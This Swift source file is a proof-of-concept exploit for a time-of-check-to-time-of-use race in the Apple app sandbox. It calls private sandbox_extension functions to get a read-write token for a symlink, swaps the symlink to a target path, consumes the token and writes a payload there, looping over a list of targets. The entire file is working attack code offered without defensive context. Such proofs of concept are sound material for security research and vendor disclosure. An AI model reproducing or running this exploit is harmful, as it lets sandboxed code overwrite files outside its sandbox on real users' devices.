import Foundation

typealias FnIssue   = @convention(c) (UnsafePointer<CChar>?, UnsafePointer<CChar>?, UInt64) -> UnsafeMutablePointer<CChar>?
typealias FnConsume = @convention(c) (UnsafePointer<CChar>?) -> Int64
typealias FnRelease = @convention(c) (Int64) -> Void

private let RTLD_DEFAULT = UnsafeMutableRawPointer(bitPattern: -2)

struct OpResult {
    let path: String
    let bytes: Int
    let success: Bool
    let error: String?
}

enum TOCTOUPoC {

    private static func loadSymbols() -> (FnIssue, FnConsume, FnRelease)? {
        guard let sIssue   = dlsym(RTLD_DEFAULT, "sandbox_extension_issue_file"),
              let sConsume = dlsym(RTLD_DEFAULT, "sandbox_extension_consume"),
              let sRelease = dlsym(RTLD_DEFAULT, "sandbox_extension_release")
        else { return nil }
        return (unsafeBitCast(sIssue,   to: FnIssue.self),
                unsafeBitCast(sConsume, to: FnConsume.self),
                unsafeBitCast(sRelease, to: FnRelease.self))
    }

    static func write(targetPath: String,
                      workDir: URL,
                      payload: Data = Data("PWNED_BY_TOCTOU".utf8),
                      onLog: @escaping (String) -> Void) -> OpResult {

        guard let (issue, consume, release) = loadSymbols() else {
            onLog("[-] symbols NOT found")
            return OpResult(path: targetPath, bytes: 0, success: false, error: "symbols missing")
        }

        let stagePath = workDir.appendingPathComponent("s")
        let linkPath  = workDir.appendingPathComponent("l")
        let stageC = stagePath.path
        let linkC  = linkPath.path
        let targetC = targetPath

        let fm = FileManager.default
        fm.createFile(atPath: stageC, contents: Data("x".utf8))

        unlink(linkC)
        guard symlink(stageC, linkC) == 0 else {
            onLog("[-] symlink(l->s) errno=\(errno)")
            return OpResult(path: targetPath, bytes: 0, success: false, error: "symlink stage errno \(errno)")
        }
        onLog("[*] l -> s (staging)")

        let cls = strdup("com.apple.app-sandbox.read-write")!
        defer { free(cls) }

        let tokenPtr: UnsafeMutablePointer<CChar>? = linkC.withCString { lp in
            issue(cls, lp, 0)
        }
        guard let token = tokenPtr else {
            onLog("[-] issue_file -> NULL errno=\(errno)")
            unlink(linkC); unlink(stageC)
            return OpResult(path: targetPath, bytes: 0, success: false, error: "issue NULL errno \(errno)")
        }
        onLog("[*] token acquired")

        unlink(linkC)
        guard symlink(targetC, linkC) == 0 else {
            onLog("[-] swap symlink errno=\(errno)")
            free(token); unlink(linkC); unlink(stageC)
            return OpResult(path: targetPath, bytes: 0, success: false, error: "swap symlink errno \(errno)")
        }
        onLog("[*] l -> p (attack) SWAPPED")

        let handle = consume(token)
        free(token)
        onLog("[*] consume handle=\(handle)")

        var result: OpResult
        do {
            try payload.write(to: URL(fileURLWithPath: linkC), options: [])
            result = OpResult(path: targetPath, bytes: payload.count, success: true, error: nil)
            onLog("[+] WRITE SUCCESS: \(targetPath) - \(payload.count)B")
        } catch {
            result = OpResult(path: targetPath, bytes: 0, success: false, error: error.localizedDescription)
            onLog("[-] WRITE FAIL: \(targetPath): \(error.localizedDescription)")
        }

        if handle > 0 { release(handle) }
        unlink(linkC); unlink(stageC)
        return result
    }

    static func runAll(paths: [String],
                       onLog: @escaping (String) -> Void,
                       onResult: @escaping (OpResult) -> Void) {
        let workDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("toctou", isDirectory: true)
        try? FileManager.default.createDirectory(at: workDir, withIntermediateDirectories: true)

        onLog("[*] sandbox_extension TOCTOU (WRITE) starting")
        for p in paths {
            let r = write(targetPath: p, workDir: workDir, onLog: onLog)
            onResult(r)
        }
        onLog("[*] done")
    }
}
